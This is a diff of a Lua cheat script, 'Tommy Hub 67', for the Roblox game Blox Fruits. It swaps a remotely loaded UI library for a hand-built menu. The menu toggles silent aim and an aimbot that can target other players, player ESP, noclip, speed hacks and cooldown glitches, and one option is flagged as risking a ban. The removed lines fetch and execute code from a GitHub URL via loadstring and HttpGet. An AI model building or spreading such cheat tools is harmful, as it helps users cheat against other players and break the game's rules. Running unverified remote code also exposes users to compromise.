@@ -1,10 +1,7 @@
 --==============================================================
--- TOMMY HUB 67  |  Grief.cc Edition
--- Combat · Glitches · Soru · ESP · Dungeons · Aimbot 67
+-- TOMMY HUB 67  |  Combat · Glitches · Soru · ESP · Aimbot 67
 -- TikTok: @accountxz
 --==============================================================
-
---==================== SERVICIOS ====================
 local Players      = game:GetService("Players")
 local RunService   = game:GetService("RunService")
 local UIS          = game:GetService("UserInputService")
@@ -16,29 +13,37 @@ local VIM; pcall(function() VIM = game:GetService("VirtualInputManager") end)
 
 local env = (getgenv and getgenv()) or _G
 if env.TommyHub67 then pcall(env.TommyHub67) end
-if env.Grief_Unload then pcall(env.Grief_Unload) end
 
 local conns, alive = {}, true
 local function track(c) table.insert(conns, c) return c end
 
 --==================== ESTADO ====================
 local S = {
+    -- Silent Aim
     SkillAimbot=false, DragonM1=false, TargetPlayers=true, TargetMobs=false,
     TeamCheck=false, PvPCheck=true, SafeZoneCheck=true, MaxDist=2500, Rainbow=false,
+    -- Aimbot 67 Descarado
     A67_Enabled=false, A67_Prediction=0.15, A67_MaxDist=1500,
     A67_TargetNPC=true, A67_TargetPlayer=false, A67_ShowMarker=true,
+    -- Combate
     FastAttack=false, AntiStun=false, WalkSpeed=false, Speed=50,
     Dash=false, DashLen=50, Noclip=false, WaterWalk=false, AutoV4=false,
     AimlockP=false, AimlockN=false,
+    -- Glitches
     SangNoCD=false, SangAuto=false, SangDrop=2, NoAnim=false, JumpPower=500,
     SoulGuitar=false, SoulDash=121, AntiLava=false, DelShip=false, SuperJump=false,
+    -- Soru
     InfSoru=false, SoruAimbot=false, SoruTarget="Nearest", SoruDist=1000,
     PortalSoru=false, PortalSoruDelay=0.35,
     PortalSangC=false, PortalSangCDelay=0.35, PortalSangCTrigger="PortalF",
     FlashCombo=false, FlashWeapon="Fruit", FlashKey="Z", FlashDelay=0.3,
+    -- ESP
     ESP=false, ESPName=true, ESPLevel=true, ESPBounty=true, ESPFruit=true,
     ESPDist=true, ESPHP=true, ESPHighlight=false, ESPSize=12,
+    -- Dungeons
     AutoDungeon=false, DungeonWeapon="Sword", DungeonHeight=40, DungeonV4=false,
+    -- Theme
+    Theme="Purple",
 }
 local Blacklist = {}
 
@@ -772,221 +777,122 @@ local function dgSet(on)
     task.spawn(dgRun, gen)
 end
 
---==============================================================
--- UI: GRIEF.CC (OBSIDIAN) CON TODAS LAS OPCIONES EN LISTA
---==============================================================
-local ObsidianRepo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/refs/heads/main/"
-loadstring(game:HttpGet(ObsidianRepo .. "Library.lua"))()
-Library = getgenv().Library or getgenv().ObsidianLibrary
-getgenv().Library = Library
-_G.Library = Library
+--==================== UI (VIEJA - PLANA) ====================
+local TweenService = game:GetService("TweenService")
 
-ThemeManager = loadstring(game:HttpGet(ObsidianRepo .. "addons/ThemeManager.lua"))()
-SaveManager = loadstring(game:HttpGet(ObsidianRepo .. "addons/SaveManager.lua"))()
-
-local QuartzTheme = { 
-    FontColor = "ffffff", MainColor = "232330", AccentColor = "426e87", 
-    BackgroundColor = "1d1b26", OutlineColor = "27232f", FontFace = "Code", BackgroundImage = "" 
+local THEMES = {
+    Purple = Color3.fromRGB(150, 70, 255),
+    Blue   = Color3.fromRGB(60, 140, 255),
+    Red    = Color3.fromRGB(255, 70, 90),
+    Green  = Color3.fromRGB(50, 220, 130),
+    Pink   = Color3.fromRGB(255, 90, 190),
+    Gold   = Color3.fromRGB(255, 190, 40),
+    Cyan   = Color3.fromRGB(40, 220, 230),
 }
+local THEME_LIST = {"Purple", "Blue", "Red", "Green", "Pink", "Gold", "Cyan"}
+local ACCENT = THEMES.Purple
+local WHITE  = Color3.fromRGB(255, 255, 255)
+local BG0    = Color3.fromRGB(11, 11, 17)
+local BG1    = Color3.fromRGB(19, 19, 29)
+local BG2    = Color3.fromRGB(28, 28, 42)
+local OFFC   = Color3.fromRGB(48, 48, 68)
+local MUTED  = Color3.fromRGB(150, 150, 172)
+local FONT_B = Enum.Font.GothamBold
+local FONT_K = Enum.Font.GothamBlack
+local FONT_M = Enum.Font.GothamMedium
 
-pcall(function()
-    ThemeManager:SetLibrary(Library)
-    ThemeManager:SetDefaultTheme(QuartzTheme)
-end)
+local themed = {}
+local function lighten(c, a) return c:Lerp(WHITE, a) end
+local function acc(inst, prop, mix)
+    table.insert(themed, {inst, prop, mix})
+    inst[prop] = mix and mix(ACCENT) or ACCENT
+    return inst
+end
+local function mk(class, parent, props)
+    local o = Instance.new(class)
+    for k, v in pairs(props or {}) do o[k] = v end
+    o.Parent = parent
+    return o
+end
+local function corner(o, r) return mk("UICorner", o, {CornerRadius = UDim.new(0, r)}) end
+local function stroke(o, c, t, tr) return mk("UIStroke", o, {Color = c, Thickness = t or 1, Transparency = tr or 0}) end
+local function tween(o, t, props)
+    TweenService:Create(o, TweenInfo.new(t, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
+end
 
-GriefWindow = Library:CreateWindow({ 
-    Title = "Tommy Hub 67", 
-    Footer = "Grief.cc Edition | @accountxz", 
-    Center = true, AutoShow = true, NotifySide = "Right", ShowCustomCursor = false 
+local gui = Instance.new("ScreenGui")
+gui.Name = "TommyHub67_UI"; gui.ResetOnSpawn = false; gui.DisplayOrder = 99999
+pcall(function() gui.Parent = (gethui and gethui()) or game:GetService("CoreGui") end)
+if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end
+
+-- Ventana principal
+local main = mk("Frame", gui, {
+    Size = UDim2.new(0, 500, 0, 360), Position = UDim2.new(0.5, -250, 0.5, -180),
+    BackgroundColor3 = BG0, BackgroundTransparency = 0.04, BorderSizePixel = 0,
+    Active = true, ClipsDescendants = true,
 })
-Window = GriefWindow
-getgenv().Window = Window
+corner(main, 14)
+acc(stroke(main, ACCENT, 1.4, 0.35), "Color")
+mk("UIGradient", main, {Rotation = 90, Color = ColorSequence.new(Color3.fromRGB(24, 21, 38), Color3.fromRGB(10, 10, 15))})
 
-Tabs = {}
-Tabs.Combat    = Window:AddTab("Combat", "swords")
-Tabs.Character = Window:AddTab("Character", "person-standing")
-Tabs.Visuals   = Window:AddTab("Visuals", "eye")
-Tabs.World     = Window:AddTab("World", "earth")
-Tabs.Misc      = Window:AddTab("Misc", "circle-ellipsis")
-Tabs['UI Settings'] = Window:AddTab("UI Settings", "settings")
-_G.Tabs = Tabs
-getgenv().Tabs = Tabs
-
---==================== TAB: COMBAT ====================
-local CombatLeft = Tabs.Combat:AddLeftGroupbox("Silent Aim")
-
-CombatLeft:AddToggle("SilentAim", {
-    Text = "silent aim (enable)",
-    Default = false,
-    Callback = function(val)
-        S.SkillAimbot = val
-        if not val then currentTarget = nil end
-    end
-}):AddKeyPicker("SilentAimKey", {
-    Text = "silent aim",
-    Default = "None",
-    Mode = "Toggle",
-    SyncToggleState = false,
-    Callback = function(state)
-        S.SkillAimbot = state
-        if not state then currentTarget = nil end
-    end
+-- Header
+local header = mk("Frame", main, {Size = UDim2.new(1, 0, 0, 46), BackgroundTransparency = 1})
+local logo = mk("Frame", header, {Size = UDim2.new(0, 30, 0, 30), Position = UDim2.new(0, 12, 0, 8), BorderSizePixel = 0})
+acc(logo, "BackgroundColor3"); corner(logo, 9)
+mk("TextLabel", logo, {Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Text = "T", Font = FONT_K, TextSize = 17, TextColor3 = WHITE})
+local title = mk("TextLabel", header, {
+    Text = "TOMMY HUB 67", Font = FONT_K, TextSize = 15, TextColor3 = WHITE, BackgroundTransparency = 1,
+    Size = UDim2.new(0, 200, 0, 18), Position = UDim2.new(0, 50, 0, 6), TextXAlignment = Enum.TextXAlignment.Left,
 })
-
-CombatLeft:AddSlider("HitChance", {
-    Text = "hit chance",
-    Default = 100, Min = 0, Max = 100, Rounding = 0, Compact = true,
-    Callback = function(val) end
+acc(mk("UIGradient", title, {}), "Color", function(c) return ColorSequence.new(c, lighten(c, 0.55)) end)
+mk("TextLabel", header, {
+    Text = "@accountxz  •  Blox Fruits", Font = FONT_M, TextSize = 10, TextColor3 = MUTED, BackgroundTransparency = 1,
+    Size = UDim2.new(0, 200, 0, 14), Position = UDim2.new(0, 50, 0, 25), TextXAlignment = Enum.TextXAlignment.Left,
 })
+local divider = mk("Frame", main, {Size = UDim2.new(1, -24, 0, 1), Position = UDim2.new(0, 12, 0, 46), BorderSizePixel = 0, BackgroundTransparency = 0.7})
+acc(divider, "BackgroundColor3")
 
-CombatLeft:AddDropdown("HitPartDropdown", {
-    Text = "hit part",
-    Default = "Head",
-    Values = {"Head","HumanoidRootPart","Torso","UpperTorso","LowerTorso","Left Arm","Right Arm","Left Leg","Right Leg","Closest","Random"},
-    Callback = function(val) end
+-- Arrastrar
+do
+    local dragging, dragStart, startPos, dragInput
+    header.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true; dragStart = input.Position; startPos = main.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
+        end
+    end)
+    header.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
+    end)
+    track(UIS.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local d = input.Position - dragStart
+            main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+        end
+    end))
+end
+
+-- Botón flotante
+local openBtn = mk("TextButton", gui, {
+    Size = UDim2.new(0, 44, 0, 44), Position = UDim2.new(0, 15, 0, 15), Text = "T67", Font = FONT_K, TextSize = 12,
+    TextColor3 = WHITE, BackgroundColor3 = BG0, Visible = false, Active = true, Draggable = true, AutoButtonColor = false,
 })
+corner(openBtn, 22); acc(stroke(openBtn, ACCENT, 2), "Color")
+local function setOpen(v) main.Visible = v; openBtn.Visible = not v end
+openBtn.MouseButton1Click:Connect(function() setOpen(true) end)
 
-CombatLeft:AddToggle("TargetPlayers", { Text = "target players", Default = true, Callback = function(v) S.TargetPlayers = v end })
-CombatLeft:AddToggle("TargetMobs", { Text = "target npcs", Default = false, Callback = function(v) S.TargetMobs = v end })
-CombatLeft:AddToggle("Rainbow", { Text = "rainbow target esp", Default = false, Callback = function(v) S.Rainbow = v end })
+-- Top buttons
+local function topBtn(txt, x, col, cb)
+    local b = mk("TextButton", header, {
+        Text = txt, Font = FONT_K, TextSize = 13, TextColor3 = col, BackgroundColor3 = BG2,
+        Size = UDim2.new(0, 26, 0, 26), Position = UDim2.new(1, x, 0, 10),
+    })
+    corner(b, 8)
+    b.MouseButton1Click:Connect(cb)
+end
 
-local CombatRight = Tabs.Combat:AddRightGroupbox("Aimbot 67 Descarado")
-
-CombatRight:AddToggle("A67_Enabled", {
-    Text = "aimbot 67 descarado (enable)",
-    Default = false,
-    Callback = function(v) S.A67_Enabled = v end,
-})
-CombatRight:AddToggle("A67_TargetNPC", { Text = "atacar npcs", Default = true, Callback = function(v) S.A67_TargetNPC = v end })
-CombatRight:AddToggle("A67_TargetPlayer", { Text = "atacar players", Default = false, Callback = function(v) S.A67_TargetPlayer = v end })
-CombatRight:AddToggle("A67_ShowMarker", { Text = "mostrar marcador", Default = true, Callback = function(v) S.A67_ShowMarker = v end })
-CombatRight:AddSlider("A67_Prediction", { Text = "prediccion", Default = 0.15, Min = 0, Max = 1, Rounding = 2, Compact = true, Callback = function(v) S.A67_Prediction = v end })
-CombatRight:AddSlider("A67_MaxDist", { Text = "distancia max", Default = 1500, Min = 100, Max = 5000, Rounding = 0, Compact = true, Callback = function(v) S.A67_MaxDist = v end })
-
-CombatRight:AddToggle("DragonM1", { Text = "aimbot m1 (dragon gun) ⚠ ban", Default = false, Callback = function(v) S.DragonM1 = v end })
-CombatRight:AddToggle("FastAttack", { Text = "fast attack", Default = false, Callback = function(v) S.FastAttack = v; if v then startFastAttack() end end })
-CombatRight:AddToggle("AntiStun", { Text = "anti stun + hitbox [beta]", Default = false, Callback = function(v) setAntiStun(v) end })
-CombatRight:AddToggle("AutoV4", { Text = "auto race v4", Default = false, Callback = function(v) S.AutoV4 = v end })
-
-local CombatMove = Tabs.Combat:AddRightGroupbox("Movimiento")
-CombatMove:AddToggle("WalkSpeed", { Text = "walk speed", Default = false, Callback = function(v) S.WalkSpeed = v end })
-CombatMove:AddSlider("Speed", { Text = "speed", Default = 50, Min = 16, Max = 300, Rounding = 0, Compact = true, Callback = function(v) S.Speed = v end })
-CombatMove:AddToggle("Dash", { Text = "dash distance", Default = false, Callback = function(v) S.Dash = v; applyDash(v and S.DashLen or 1) end })
-CombatMove:AddSlider("DashLen", { Text = "dash", Default = 50, Min = 1, Max = 300, Rounding = 0, Compact = true, Callback = function(v) S.DashLen = v; if S.Dash then applyDash(v) end end })
-CombatMove:AddToggle("Noclip", { Text = "noclip", Default = false, Callback = function(v) S.Noclip = v end })
-CombatMove:AddToggle("WaterWalk", { Text = "walk on water", Default = false, Callback = function(v) S.WaterWalk = v end })
-
---==================== TAB: CHARACTER ====================
-local SoruBox = Tabs.Character:AddLeftGroupbox("Soru")
-
-SoruBox:AddToggle("InfSoru", {
-    Text = "infinite soru",
-    Default = false,
-    Callback = function(v)
-        S.InfSoru = v
-        if player.Character then attachInfSoru(player.Character) end
-    end
-})
-SoruBox:AddToggle("SoruAimbot", { Text = "soru aimbot (tp)", Default = false, Callback = function(v) S.SoruAimbot = v end })
-SoruBox:AddSlider("SoruDist", { Text = "soru dist", Default = 1000, Min = 100, Max = 3500, Rounding = 0, Compact = true, Callback = function(v) S.SoruDist = v end })
-SoruBox:AddDropdown("SoruTarget", { Text = "soru target", Default = "Nearest", Values = {"Nearest"}, Callback = function(v) S.SoruTarget = v end })
-SoruBox:AddToggle("PortalSoru", { Text = "portal soru combo (x+z)", Default = false, Callback = function(v) S.PortalSoru = v end })
-SoruBox:AddSlider("PortalSoruDelay", { Text = "portal soru delay", Default = 0.35, Min = 0.05, Max = 2, Rounding = 2, Compact = true, Callback = function(v) S.PortalSoruDelay = v end })
-SoruBox:AddToggle("PortalSangC", { Text = "portal sanguine c combo", Default = false, Callback = function(v) S.PortalSangC = v end })
-SoruBox:AddSlider("PortalSangCDelay", { Text = "sanguine c delay", Default = 0.35, Min = 0.05, Max = 2, Rounding = 2, Compact = true, Callback = function(v) S.PortalSangCDelay = v end })
-SoruBox:AddToggle("FlashCombo", { Text = "flashstep skill combo", Default = false, Callback = function(v) S.FlashCombo = v end })
-
---==================== TAB: VISUALS ====================
-local ESPBox = Tabs.Visuals:AddLeftGroupbox("ESP")
-
-ESPBox:AddToggle("ESP", {
-    Text = "esp (enable)",
-    Default = false,
-    Callback = function(v)
-        S.ESP = v
-        if not v then for p in pairs(esp) do clearESP(p) end end
-    end
-})
-ESPBox:AddToggle("ESPName", { Text = "show name", Default = true, Callback = function(v) S.ESPName = v end })
-ESPBox:AddToggle("ESPLevel", { Text = "show level", Default = true, Callback = function(v) S.ESPLevel = v end })
-ESPBox:AddToggle("ESPBounty", { Text = "show bounty / pvp", Default = true, Callback = function(v) S.ESPBounty = v end })
-ESPBox:AddToggle("ESPFruit", { Text = "show devil fruit", Default = true, Callback = function(v) S.ESPFruit = v end })
-ESPBox:AddToggle("ESPDist", { Text = "show distance", Default = true, Callback = function(v) S.ESPDist = v end })
-ESPBox:AddToggle("ESPHP", { Text = "show hp %", Default = true, Callback = function(v) S.ESPHP = v end })
-ESPBox:AddToggle("ESPHighlight", { Text = "highlight players", Default = false, Callback = function(v) S.ESPHighlight = v end })
-ESPBox:AddSlider("ESPSize", { Text = "text size", Default = 12, Min = 8, Max = 32, Rounding = 0, Compact = true, Callback = function(v) S.ESPSize = v end })
-
---==================== TAB: WORLD ====================
-local DgBox = Tabs.World:AddLeftGroupbox("Auto Dungeon")
-
-DgBox:AddToggle("AutoDungeon", {
-    Text = "▶ auto dungeon (start/stop)",
-    Default = false,
-    Callback = function(v)
-        S.AutoDungeon = v
-        dgSet(v)
-    end
-})
-DgBox:AddDropdown("DungeonWeapon", {
-    Text = "arma",
-    Default = "Sword",
-    Values = {"Sword", "Melee", "Blox Fruit"},
-    Callback = function(v) S.DungeonWeapon = v end
-})
-DgBox:AddSlider("DungeonHeight", {
-    Text = "altura de ataque",
-    Default = 40, Min = 10, Max = 100, Rounding = 0, Compact = true,
-    Callback = function(v) S.DungeonHeight = v end
-})
-DgBox:AddToggle("DungeonV4", {
-    Text = "auto v4 (tecla y)",
-    Default = false,
-    Callback = function(v) S.DungeonV4 = v end
-})
-
---==================== TAB: MISC ====================
-local SangBox = Tabs.Misc:AddLeftGroupbox("Sanguine Z")
-
-SangBox:AddToggle("SangNoCD", {
-    Text = "sanguine z no cooldown",
-    Default = false,
-    Callback = function(v)
-        S.SangNoCD = v
-        local c = player.Character
-        if c then c:SetAttribute("AllCooldown", v and 3 or nil) end
-    end
-})
-SangBox:AddButton({ Text = "🩸 sanguine z manual", Func = function() sangManual() end })
-SangBox:AddToggle("SangAuto", {
-    Text = "sanguine z auto",
-    Default = false,
-    Callback = function(v)
-        S.SangAuto = v
-        if v then startSangAuto() elseif sangConn then sangConn:Disconnect(); sangConn = nil end
-    end
-})
-SangBox:AddSlider("SangDrop", { Text = "drop duration", Default = 2, Min = 0.5, Max = 5, Rounding = 1, Compact = true, Callback = function(v) S.SangDrop = v end })
-
-local TrucosBox = Tabs.Misc:AddRightGroupbox("Trucos")
-TrucosBox:AddToggle("NoAnim", { Text = "no animations", Default = false, Callback = function(v) S.NoAnim = v end })
-TrucosBox:AddToggle("SuperJump", { Text = "super jump", Default = false, Callback = function(v) S.SuperJump = v end })
-TrucosBox:AddSlider("JumpPower", { Text = "jump power", Default = 500, Min = 50, Max = 1000, Rounding = 0, Compact = true, Callback = function(v) S.JumpPower = v end })
-TrucosBox:AddToggle("SoulGuitar", { Text = "soul guitar glitch [beta]", Default = false, Callback = function(v) S.SoulGuitar = v end })
-TrucosBox:AddSlider("SoulDash", { Text = "soul dash", Default = 121, Min = 1, Max = 300, Rounding = 0, Compact = true, Callback = function(v) S.SoulDash = v end })
-TrucosBox:AddToggle("AntiLava", { Text = "anti lava", Default = false, Callback = function(v) S.AntiLava = v end })
-TrucosBox:AddToggle("DelShip", { Text = "delete ghost ship (sea 2)", Default = false, Callback = function(v) S.DelShip = v end })
-
---==================== TAB: UI SETTINGS ====================
-ThemeManager:SetLibrary(Library)
-ThemeManager:SetFolder('TommyHub67')
-ThemeManager:ApplyToTab(Tabs['UI Settings'])
-
-SaveManager:SetLibrary(Library)
-SaveManager:SetFolder('TommyHub67')
-SaveManager:BuildConfigSection(Tabs['UI Settings'])
-pcall(function() SaveManager:LoadAutoloadConfig() end)
-
---==================== CLEANUP ====================
 local function cleanup()
     alive = false
     S.SkillAimbot = false; S.A67_Enabled = false; S.AutoDungeon = false
@@ -996,13 +902,389 @@ local function cleanup()
     if rainbowHL then rainbowHL:Destroy() end
     if A67_marker then A67_marker:Destroy() end
     applyDash(1)
-    pcall(function() if Window and Window.Destroy then Window:Destroy() end end)
+    pcall(function() gui:Destroy() end)
     env.TommyHub67 = nil
 end
 env.TommyHub67 = cleanup
+topBtn("–", -70, MUTED, function() setOpen(false) end)
+topBtn("✕", -38, Color3.fromRGB(255, 90, 100), cleanup)
+track(UIS.InputBegan:Connect(function(i, gp)
+    if not gp and i.KeyCode == Enum.KeyCode.F4 then setOpen(not main.Visible) end
+end))
 
-Library:OnUnload(function()
-    pcall(cleanup)
+-- Sidebar + content
+local sidebar = mk("Frame", main, {Size = UDim2.new(0, 112, 1, -62), Position = UDim2.new(0, 10, 0, 54), BackgroundTransparency = 1})
+local tabs = mk("Frame", sidebar, {Size = UDim2.new(1, 0, 1, -22), BackgroundTransparency = 1})
+mk("UIListLayout", tabs, {Padding = UDim.new(0, 5), SortOrder = Enum.SortOrder.LayoutOrder})
+mk("TextLabel", sidebar, {
+    Text = "F4  •  abrir / cerrar", Font = FONT_M, TextSize = 9, TextColor3 = MUTED, BackgroundTransparency = 1,
+    Size = UDim2.new(1, 0, 0, 16), Position = UDim2.new(0, 0, 1, -16),
+})
+local content = mk("Frame", main, {Size = UDim2.new(1, -142, 1, -62), Position = UDim2.new(0, 132, 0, 54), BackgroundColor3 = BG1, BorderSizePixel = 0})
+corner(content, 12); stroke(content, WHITE, 1, 0.94)
+
+local ICONS = {Combat = "⚔", Glitches = "✨", Soru = "⚡", ESP = "👁", Dungeons = "🏰", Misc = "⚙"}
+local pages, tabObjs, currentPage, tabCount = {}, {}, nil, 0
+local function showPage(name)
+    currentPage = name
+    for n, p in pairs(pages) do p.Visible = (n == name) end
+    for n, t in pairs(tabObjs) do
+        local on = (n == name)
+        t.bar.Visible = on
+        t.btn.BackgroundColor3 = ACCENT
+        t.btn.BackgroundTransparency = on and 0.85 or 1
+        t.btn.TextColor3 = on and WHITE or MUTED
+    end
+end
+local function newPage(name)
+    local sf = mk("ScrollingFrame", content, {
+        Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, BorderSizePixel = 0, ScrollBarThickness = 3,
+        AutomaticCanvasSize = Enum.AutomaticSize.Y, CanvasSize = UDim2.new(), Visible = false,
+    })
+    acc(sf, "ScrollBarImageColor3")
+    mk("UIListLayout", sf, {Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.LayoutOrder})
+    mk("UIPadding", sf, {PaddingTop = UDim.new(0, 8), PaddingBottom = UDim.new(0, 8), PaddingLeft = UDim.new(0, 8), PaddingRight = UDim.new(0, 10)})
+    pages[name] = sf
+    tabCount = tabCount + 1
+    local btn = mk("TextButton", tabs, {
+        Text = "  " .. (ICONS[name] or "•") .. "  " .. name, Font = FONT_B, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left,
+        Size = UDim2.new(1, 0, 0, 32), BackgroundTransparency = 1, BorderSizePixel = 0, AutoButtonColor = false,
+        TextColor3 = MUTED, LayoutOrder = tabCount,
+    })
+    corner(btn, 8)
+    local bar = mk("Frame", btn, {Size = UDim2.new(0, 3, 0, 16), Position = UDim2.new(0, 0, 0.5, -8), BorderSizePixel = 0, Visible = false})
+    acc(bar, "BackgroundColor3"); corner(bar, 2)
+    tabObjs[name] = {btn = btn, bar = bar}
+    btn.MouseButton1Click:Connect(function() showPage(name) end)
+    return sf
+end
+
+local orderN = {}
+local function nextOrder(page) orderN[page] = (orderN[page] or 0) + 1; return orderN[page] end
+local reg = {}
+
+local function section(page, text)
+    local f = mk("Frame", page, {Size = UDim2.new(1, 0, 0, 22), BackgroundTransparency = 1, LayoutOrder = nextOrder(page)})
+    local l = mk("TextLabel", f, {
+        Text = string.upper(text), Font = FONT_K, TextSize = 10, BackgroundTransparency = 1,
+        Size = UDim2.new(1, 0, 0, 18), Position = UDim2.new(0, 2, 0, 2), TextXAlignment = Enum.TextXAlignment.Left,
+    })
+    acc(l, "TextColor3")
+    mk("Frame", f, {Size = UDim2.new(1, 0, 0, 1), Position = UDim2.new(0, 0, 1, -1), BackgroundColor3 = BG2, BorderSizePixel = 0})
+end
+local function row(page, h)
+    local f = mk("Frame", page, {Size = UDim2.new(1, 0, 0, h or 34), BackgroundColor3 = BG2, BorderSizePixel = 0, LayoutOrder = nextOrder(page)})
+    corner(f, 9)
+    local st = stroke(f, WHITE, 1, 0.95)
+    return f, st
+end
+local function rowLabel(f, text, rightPad)
+    return mk("TextLabel", f, {
+        Text = text, Font = FONT_M, TextSize = 11, TextColor3 = WHITE, BackgroundTransparency = 1,
+        Size = UDim2.new(1, -(rightPad or 66), 1, 0), Position = UDim2.new(0, 12, 0, 0),
+        TextXAlignment = Enum.TextXAlignment.Left, TextTruncate = Enum.TextTruncate.AtEnd,
+    })
+end
+
+local function toggle(page, text, key, cb)
+    local f = row(page, 34); rowLabel(f, text, 66)
+    local trackF = mk("Frame", f, {Size = UDim2.new(0, 40, 0, 20), Position = UDim2.new(1, -52, 0.5, -10), BorderSizePixel = 0})
+    corner(trackF, 10)
+    local knob = mk("Frame", trackF, {Size = UDim2.new(0, 14, 0, 14), Position = UDim2.new(0, 3, 0.5, -7), BackgroundColor3 = WHITE, BorderSizePixel = 0})
+    corner(knob, 7)
+    local hit = mk("TextButton", f, {Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Text = "", ZIndex = 5})
+    local function refresh(instant)
+        local on = S[key]
+        local col = on and ACCENT or OFFC
+        local pos = on and UDim2.new(0, 23, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
+        if instant then
+            trackF.BackgroundColor3 = col; knob.Position = pos
+        else
+            tween(trackF, 0.15, {BackgroundColor3 = col}); tween(knob, 0.15, {Position = pos})
+        end
+    end
+    refresh(true)
+    reg[key] = {refresh = refresh, cb = cb}
+    hit.MouseButton1Click:Connect(function()
+        S[key] = not S[key]; refresh()
+        if cb then pcall(cb, S[key]) end
+    end)
+end
+
+local function stepper(page, text, key, minV, maxV, step, suffix)
+    local f = row(page, 40)
+    local lbl = rowLabel(f, text, 118); lbl.Size = UDim2.new(1, -118, 1, -8)
+    local function fmt(v) v = math.floor(v * 100 + 0.5) / 100; return tostring(v) .. (suffix or "") end
+    local function mkBtn(txt, x)
+        local b = mk("TextButton", f, {
+            Text = txt, Font = FONT_K, TextSize = 14, TextColor3 = WHITE, BackgroundColor3 = Color3.fromRGB(42, 42, 62),
+            Size = UDim2.new(0, 24, 0, 24), Position = UDim2.new(1, x, 0, 6),
+        })
+        corner(b, 7)
+        return b
+    end
+    local minus = mkBtn("-", -108)
+    local val = mk("TextLabel", f, {
+        Size = UDim2.new(0, 52, 0, 24), Position = UDim2.new(1, -82, 0, 6), BackgroundTransparency = 1,
+        Font = FONT_B, TextSize = 11, TextColor3 = WHITE,
+    })
+    local plus = mkBtn("+", -30)
+    local barBG = mk("Frame", f, {Size = UDim2.new(1, -24, 0, 3), Position = UDim2.new(0, 12, 1, -7), BackgroundColor3 = OFFC, BorderSizePixel = 0})
+    corner(barBG, 2)
+    local fill = mk("Frame", barBG, {Size = UDim2.new(0, 0, 1, 0), BorderSizePixel = 0})
+    acc(fill, "BackgroundColor3"); corner(fill, 2)
+    local function update()
+        val.Text = fmt(S[key])
+        local frac = (S[key] - minV) / math.max(maxV - minV, 1e-9)
+        fill.Size = UDim2.new(math.clamp(frac, 0, 1), 0, 1, 0)
+    end
+    update()
+    reg[key] = {update = update}
+    minus.MouseButton1Click:Connect(function() S[key] = math.max(minV, math.floor((S[key] - step) * 100 + 0.5) / 100); update() end)
+    plus.MouseButton1Click:Connect(function() S[key] = math.min(maxV, math.floor((S[key] + step) * 100 + 0.5) / 100); update() end)
+end
+
+local function button(page, text, cb)
+    local f, st = row(page, 34)
+    st.Thickness = 1; st.Transparency = 0.55; acc(st, "Color")
+    local b = mk("TextButton", f, {
+        Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Text = text, Font = FONT_B, TextSize = 11, AutoButtonColor = false,
+    })
+    acc(b, "TextColor3", function(c) return lighten(c, 0.3) end)
+    b.MouseButton1Click:Connect(function()
+        tween(f, 0.08, {BackgroundColor3 = BG1})
+        task.delay(0.1, function() tween(f, 0.15, {BackgroundColor3 = BG2}) end)
+        cb(b)
+    end)
+    return b
+end
+
+local function cycle(page, prefix, key, options, cb)
+    local btn = button(page, prefix .. tostring(S[key]), function(b)
+        local idx = table.find(options, S[key]) or 0
+        S[key] = options[(idx % #options) + 1]
+        b.Text = prefix .. tostring(S[key])
+        if cb then cb(S[key]) end
+    end)
+    reg[key] = {update = function() btn.Text = prefix .. tostring(S[key]) end}
+end
+
+local function applyTheme(name)
+    ACCENT = THEMES[name] or ACCENT
+    for _, t in ipairs(themed) do
+        pcall(function() t[1][t[2]] = t[3] and t[3](ACCENT) or ACCENT end)
+    end
+    for _, e in pairs(reg) do if e.refresh then e.refresh(true) end end
+    if currentPage then showPage(currentPage) end
+end
+
+--==================== PÁGINAS ====================
+local Combat  = newPage("Combat")
+local Glitch  = newPage("Glitches")
+local Soru    = newPage("Soru")
+local ESPpage = newPage("ESP")
+local Dungeon = newPage("Dungeons")
+
+-- === COMBAT ===
+section(Combat, "Silent Aim")
+toggle(Combat, "Silent Aim (Skills)", "SkillAimbot")
+toggle(Combat, "Aimbot M1 (Dragon Gun) ⚠ BAN", "DragonM1")
+toggle(Combat, "Target Players", "TargetPlayers")
+toggle(Combat, "Target NPCs", "TargetMobs")
+toggle(Combat, "Team Check", "TeamCheck")
+toggle(Combat, "Ignore PvP OFF", "PvPCheck")
+toggle(Combat, "Rainbow Target ESP", "Rainbow")
+stepper(Combat, "Max Dist:", "MaxDist", 100, 5000, 250, "st")
+
+section(Combat, "Aimbot 67 Descarado (Visible)")
+toggle(Combat, "▶ Aimbot 67 Descarado", "A67_Enabled")
+toggle(Combat, "Atacar NPCs", "A67_TargetNPC")
+toggle(Combat, "Atacar Players", "A67_TargetPlayer")
+toggle(Combat, "Mostrar Marcador", "A67_ShowMarker")
+stepper(Combat, "Predicción:", "A67_Prediction", 0, 1, 0.05, "s")
+stepper(Combat, "Distancia Máx:", "A67_MaxDist", 100, 5000, 100, "st")
+
+section(Combat, "Combate")
+toggle(Combat, "Fast Attack", "FastAttack", function(v) if v then startFastAttack() end end)
+toggle(Combat, "Anti Stun + Hitbox [Beta]", "AntiStun", function(v) setAntiStun(v) end)
+toggle(Combat, "Auto Race V4", "AutoV4")
+
+section(Combat, "Movimiento")
+toggle(Combat, "Walk Speed", "WalkSpeed")
+stepper(Combat, "Speed:", "Speed", 16, 300, 10, "")
+toggle(Combat, "Dash Distance", "Dash", function(v) if v then applyDash(S.DashLen) else applyDash(1) end end)
